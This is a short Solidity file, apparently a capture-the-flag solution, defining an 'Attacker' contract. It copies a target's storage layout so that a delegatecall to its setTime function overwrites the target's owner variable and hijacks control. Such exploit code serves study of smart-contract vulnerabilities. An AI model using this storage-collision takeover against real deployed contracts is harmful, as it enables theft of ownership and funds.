// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    function setTime(uint256 _time) public {
        address newOwner = address(uint160(_time));
        owner = newOwner;
    }
}
